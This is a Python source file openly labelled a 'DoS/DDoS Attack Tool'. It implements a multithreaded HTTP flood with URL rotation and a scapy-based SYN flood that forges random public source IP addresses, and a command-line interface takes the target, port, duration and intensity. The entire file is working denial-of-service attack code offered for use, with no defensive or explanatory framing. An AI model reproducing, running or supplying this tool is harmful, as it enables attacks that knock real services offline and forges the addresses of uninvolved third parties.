import socket
import threading
import time
import argparse
import random
from concurrent.futures import ThreadPoolExecutor
from scapy.all import IP, TCP, send

# HTTP Flood with Thread Pool and URL Rotation
class HTTPFlood:
    def __init__(self, target, port, urls_file, duration, intensity):
        self.target = target
        self.port = port
        self.urls = self.read_urls(urls_file)
        self.duration = duration
        self.intensity = intensity  # Amount of working threads

    def read_urls(self, filename):
        try:
            with open(filename, 'r') as f:
                return [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"File {filename} not found.")
            return []

    def send_request(self, url):
        try:
            http_request = f"GET {url} HTTP/1.1\r\nHost: {self.target}\r\n\r\n"
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(10)
                s.connect((self.target, self.port))
                s.send(http_request.encode())
        except Exception as e:
            pass  # Errors do not clutter the output, the load does not stop

    def start_attack(self):
        print("Starting HTTP flood attack with thread pool and URL rotation...")
        stop_time = time.time() + self.duration
        with ThreadPoolExecutor(max_workers=self.intensity) as executor:
            while time.time() < stop_time:
                # For multithreading: tasks are submitted in batches to a pool of workers
                for _ in range(self.intensity):
                    url = random.choice(self.urls)
                    executor.submit(self.send_request, url)
                time.sleep(1)
        print("HTTP flood attack completed.")

# SYN Flood is sent with bunch of packets and improved spoofing addresses
class SynFlood:
    def __init__(self, target, port, duration, pps):
        self.target = target
        self.port = port
        self.duration = duration
        self.pps = pps

    def random_ip(self):
        # A random public IP address is generated (without private subnets)
        while True:
            octets = [random.randint(1, 254) for _ in range(4)]
            ip = '.'.join(map(str, octets))
            first = octets[0]
            if first not in (10, 127, 192, 172, 169):  # exclude private and special subnets
                return ip

    def start_attack(self):
        print("Starting SYN flood attack with batch sending and IP spoofing...")
        stop_time = time.time() + self.duration
        batch_size = min(100, self.pps) if self.pps > 10 else 1  # select an optimal number in the bunch
        while time.time() < stop_time:
            for _ in range(batch_size):
                src_ip = self.random_ip()
                packet = IP(src=src_ip, dst=self.target) / TCP(dport=self.port, flags="S")
                send(packet, verbose=0)
            if self.pps > batch_size:
                time.sleep(batch_size / self.pps)
        print("SYN flood attack completed.")


def main():
    parser = argparse.ArgumentParser(description='DoS/DDoS Attack Tool')
    parser.add_argument('attack_type', choices=['http', 'syn'], help='Type of attack (http or syn)')
    parser.add_argument('-t', '--target', required=True, help='Target IP or domain')
    parser.add_argument('-p', '--port', type=int, required=True, help='Target port')
    parser.add_argument('-d', '--duration', type=int, default=60, help='Attack duration in seconds')
    parser.add_argument('-i', '--intensity', type=int, default=100, help='Intensity (threads or packets/sec)')
    parser.add_argument('-u', '--urls', type=str, help='File containing URLs for HTTP flood')
    args = parser.parse_args()

    if args.attack_type == 'http':
        if not args.urls:
            print("For HTTP flood, please provide a URLs file.")
            return
        http_flood = HTTPFlood(args.target, args.port, args.urls, args.duration, args.intensity)
        http_flood.start_attack()
    elif args.attack_type == 'syn':
        syn_flood = SynFlood(args.target, args.port, args.duration, args.intensity)
        syn_flood.start_attack()

if __name__ == "__main__":
    main()

